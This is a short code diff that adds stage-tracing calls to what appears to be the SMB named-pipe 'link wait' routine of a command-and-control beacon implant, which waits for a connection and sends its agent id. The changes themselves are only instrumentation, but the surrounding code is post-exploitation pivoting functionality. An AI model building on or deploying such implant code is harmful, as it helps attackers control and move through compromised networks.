@@ -60,7 +60,9 @@ void smb_stop() {
 /*
 * put this beacon into a mode where it's waiting for a connection to its pipe
 */
+extern void lk_mark(const char * stage);
 void command_link_wait() {
+	lk_mark("link-wait-enter");
 	/* setup our SMB server */
 	if (!smb_init()) {
 		return;
@@ -69,7 +71,9 @@ void command_link_wait() {
 	/* while we are an SMB server... do this stuff */
 	while (sleep_time > 0) {
 		/* wait for a connection and send our agent id */
+		lk_mark("pre-smb-wait");
 		smb_wait();
+		lk_mark("client-connected");
 
 		/* process data */
 		client_process();
